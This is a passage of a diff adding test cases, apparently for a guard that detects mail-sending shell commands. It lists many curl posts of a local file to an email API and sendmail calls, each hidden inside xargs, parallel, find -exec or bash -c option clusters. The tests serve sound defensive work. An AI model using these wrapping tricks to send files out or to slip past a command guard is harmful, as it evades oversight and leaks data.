+      "name": "MAILRUNTIMECMD1126: review 3: M42 xargs -S 100 curl (BSD value)",
+      "cmd": "echo x | xargs -S 100 curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M43 xargs -R 2 -I{} sh -c",
+      "cmd": "echo x | xargs -R 2 -I{} sh -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M44 xargs -S 100 -R 2 -I % curl with the URL from input",
+      "cmd": "echo https://api.resend.com/emails | xargs -S 100 -R 2 -I % curl -d @m.json %",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M45 xargs -n1 -S 100 sendmail",
+      "cmd": "echo a@b.example | xargs -n1 -S 100 sendmail",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M46 xargs -R -1 -I{} curl",
+      "cmd": "echo m.json | xargs -R -1 -I{} curl -d @{} https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M47 xargs -S100 (attached) curl",
+      "cmd": "echo x | xargs -S100 curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M48 xargs -tS 100 curl (cluster)",
+      "cmd": "echo x | xargs -tS 100 curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M51 parallel one quoted word, literal URL",
+      "cmd": "parallel 'curl -d @{} https://api.resend.com/emails' ::: m.json",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M52 parallel -j2 one quoted word sendmail",
+      "cmd": "parallel -j2 'sendmail {}' ::: a@b.example",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M53 parallel one quoted word with -I",
+      "cmd": "parallel -I % 'curl -d @m.json %' ::: https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M54 parallel quoted word with a tab",
+      "cmd": "parallel 'curl\t-d @m.json https://api.resend.com/emails' ::: x",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M55 parallel two quoted words",
+      "cmd": "parallel 'curl -d @m.json' 'https://api.resend.com/emails' ::: x",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M56 parallel quoted template piped",
+      "cmd": "cat list | parallel 'wget --post-file m.json {}'",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M57 control: parallel quoted echo",
+      "cmd": "parallel 'echo {} done' ::: a b",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M60 control: sh -c echo",
+      "cmd": "sh -oe pipefail -c 'echo hi'",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M61 control: xargs -S 100 echo",
+      "cmd": "echo x | xargs -S 100 echo",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M62 control: bash run.sh -c arg",
+      "cmd": "bash run.sh -c build",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M63 control: curl read of a docs page via zsh -5 -c",
+      "cmd": "zsh -5 -c 'curl -s https://example.org/'",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M34 bash -oc pipefail program (o not last, c in the cluster)",
+      "cmd": "bash -oc pipefail 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N01 find: group closes, then -exec sends",
+      "cmd": "find . \\( -name a -exec echo {} \\; \\) -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N02 find: -false -o group with the send",
+      "cmd": "find . -exec echo {} \\; -false -o \\( -exec curl -d @{} https://api.resend.com/emails \\; \\)",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N03 find: two harmless actions with words between, third sends",
+      "cmd": "find . -exec echo {} \\; -print -exec echo {} \\; -print -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N04 control: find, harmless action, then tests only",
+      "cmd": "find . -exec echo {} \\; -print -name x",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N05 find: line continuation after the first action",
+      "cmd": "find . -exec echo {} \\; \\\n  -print -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N06 find: quoted option word between",
+      "cmd": "find . -exec echo {} \\; '-print' -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N07 find: inside sh -c",
+      "cmd": "sh -c 'find . -exec echo {} \\; -print -exec curl -d @m.json https://api.resend.com/emails \\;'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N08 find: second action -okdir sendmail after -type f",
+      "cmd": "find . -exec echo {} \\; -type f -okdir sendmail a@b.example \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N09 gfind -exec curl",
+      "cmd": "gfind . -name m.json -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N10 /usr/bin/find -exec curl",
+      "cmd": "/usr/bin/find . -name m.json -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N11 command find, words between",
+      "cmd": "command find . -exec echo {} \\; -print -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N12 find: double-quoted semicolon, word between",
+      "cmd": "find . -exec echo {} \";\" -print -exec curl -d @{} https://api.resend.com/emails \";\"",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N13 find: second action ends with +",
+      "cmd": "find . -exec echo {} \\; -print -exec curl -d @m.json https://api.resend.com/emails {} +",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N14 find: the send is the FIRST action, harmless after",
+      "cmd": "find . -exec curl -d @{} https://api.resend.com/emails \\; -print -exec echo {} \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N15 find: && after the first action, then a new find",
+      "cmd": "find . -exec echo {} \\; && find . -print -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N16 control: two finds, harmless",
+      "cmd": "find . -exec echo {} \\; -print -exec ls {} \\;",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N17 control: segment starting with an option, -exec grep",
+      "cmd": "find . -exec echo {} \\; -print -exec grep -l resend {} \\;",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N18 find: -exec env curl after words",
+      "cmd": "find . -exec echo {} \\; -print -exec env X=1 curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N19 find: -exec xargs-like bash -lc after !",
+      "cmd": "find . -exec echo {} \\; ! -name x -exec bash -lc 'sendmail a@b.example' \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N21 bash -ooc pipefail errexit",
+      "cmd": "bash -ooc pipefail errexit 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N22 bash -Oc extglob",
+      "cmd": "bash -Oc extglob 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N23 bash -coo pipefail errexit",
+      "cmd": "bash -coo pipefail errexit 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N24 bash -oec pipefail",
+      "cmd": "bash -oec pipefail 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N25 sh -oc pipefail",
+      "cmd": "sh -oc pipefail 'sendmail a@b.example'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N26 bash -oOc pipefail extglob",
+      "cmd": "bash -oOc pipefail extglob 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N27 bash -oc pipefail with -e after",
+      "cmd": "bash -oc pipefail -e 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N28 bash -o pipefail -oc errexit",
+      "cmd": "bash -o pipefail -oc errexit 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N29 env bash -oc pipefail",
+      "cmd": "env X=1 bash -oc pipefail 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N30 control: bash -oc pipefail echo",
+      "cmd": "bash -oc pipefail 'echo hi'",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: N31 control: bash -o pipefail script.sh",
+      "cmd": "bash -o pipefail build.sh",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P02 single action, continuation line before -exec",
+      "cmd": "find . -name m.json \\\n  -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P03 adjacent actions, continuation line between",
+      "cmd": "find . -exec echo {} \\; \\\n  -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P04 plain curl, continuation line before the URL",
+      "cmd": "curl -d @m.json \\\n  https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P05 continuation line right after the escaped semicolon, no blank",
+      "cmd": "find . -exec echo {} \\;\\\n -print -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P06 continuation line inside the second action",
+      "cmd": "find . -exec echo {} \\; -print -exec curl -d @{} \\\n  https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P07 continuation line after the between word",
+      "cmd": "find . -exec echo {} \\; -print \\\n  -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P08 two continuation lines",
+      "cmd": "find . \\\n  -exec echo {} \\; \\\n  -type f \\\n  -exec sendmail a@b.example \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P09 quoted semicolon, continuation line",
+      "cmd": "find . -exec echo {} ';' \\\n  -print -exec curl -d @{} https://api.resend.com/emails ';'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P10 first action ends with +, continuation line",
+      "cmd": "find . -exec echo {} + \\\n  -print -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P11 tab between instead of a blank",
+      "cmd": "find . -exec echo {} \\;\t-print -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P12 two blanks between",
+      "cmd": "find . -exec echo {} \\;  -print -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 4: P13 control: continuation line, harmless second action",
+      "cmd": "find . -exec echo {} \\; \\\n  -print -exec ls {} \\;",
+      "expected": false
     }
   ]
 }
